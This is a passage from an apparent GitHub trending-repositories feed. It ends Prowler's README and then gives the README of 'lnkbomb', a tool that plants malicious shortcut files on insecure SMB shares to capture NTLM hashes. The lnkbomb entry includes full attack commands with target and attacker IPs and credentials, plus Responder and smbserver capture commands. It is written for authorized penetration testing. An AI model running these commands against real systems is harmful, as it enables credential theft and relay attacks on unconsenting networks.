&#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python: we got rid of all bash and it is now all in Python.&lt;/li&gt; &#xA; &lt;li&gt;Faster: huge performance improvements (same account from 2.5 hours to 4 minutes).&lt;/li&gt; &#xA; &lt;li&gt;Developers and community: we have made it easier to contribute with new checks and new compliance frameworks. We also included unit tests.&lt;/li&gt; &#xA; &lt;li&gt;Multi-cloud: in addition to AWS, we have added Azure, we plan to include GCP and OCI soon, let us know if you want to contribute!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;📃 License&lt;/h1&gt; &#xA;&lt;p&gt;Prowler is licensed as Apache License 2.0 as specified in each file. You may obtain a copy of the License at &lt;a href=&#34;http://www.apache.org/licenses/LICENSE-2.0&#34;&gt;http://www.apache.org/licenses/LICENSE-2.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dievus/lnkbomb</title>
    <updated>2022-12-25T01:35:30Z</updated>
    <id>tag:github.com,2022-12-25:/dievus/lnkbomb</id>
    <link href="https://github.com/dievus/lnkbomb" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Malicious shortcut generator for collecting NTLM hashes from insecure file shares.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Lnkbomb&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ko-fi.com/M4M03Q2JN&#34;&gt;&lt;img src=&#34;https://ko-fi.com/img/githubbutton_sm.svg?sanitize=true&#34; alt=&#34;ko-fi&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/dievus/lnkbomb/raw/dev/images/example.png&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Lnkbomb is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file. This icon file can be directed to a penetration tester&#39;s machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.&lt;/p&gt; &#xA;&lt;p&gt;The payload file is uploaded directly to the insecure file specified by the tester in the command line. The tester includes their IP address as well, which is written into the payload.&lt;/p&gt; &#xA;&lt;p&gt;Version 2.0 is a total rebuild of the tool and uses the pysmb library, permitting unauthenticated and authenticated payload drops.&lt;/p&gt; &#xA;&lt;h2&gt;Python Usage&lt;/h2&gt; &#xA;&lt;p&gt;Installing Lnkbomb&lt;/p&gt; &#xA;&lt;p&gt;Note that the project works consistently in Windows. It may have issues in Linux.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;git clone https://github.com/dievus/lnkbomb.git&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Change directories to lnkbomb and run:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python3 lnkbomb.py -h&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;This will output the help menu, which contains the following flags:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-h, --help - Lists the help options&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-t, --target - Specifies the target IP address&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-a, --attacker - Specifies the tester&#39;s attack machine IP address&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-r, --recover - Used to remove the payload when testing is completed (ex. -r payloadname.url)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-w, --windows - New command - required for setting appropriate ports for Windows shares&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-l, --linux - New command - required for setting appropriate ports for Linux shares&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;-n, --netbios - New command - netbios name for targeted Windows machines must be included&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Examples of full commands include:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows -r dicnwdsebl.url&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;You will need to utilize a tool like Responder or smbserver to capture the NTLM hash.&lt;br&gt; &lt;code&gt;responder -I eth0 -dwFP -v&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;smbserver.py . . -smb2support&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/dievus/lnkbomb/raw/dev/images/example2.png&#34;&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Notes&lt;/h3&gt; &#xA;&lt;p&gt;Please keep in mind that this tool is meant for ethical hacking and penetration testing purposes only. I do not condone any behavior that would include testing targets that you do not currently have permission to test against.&lt;/p&gt;</summary>
  </entry>
</feed>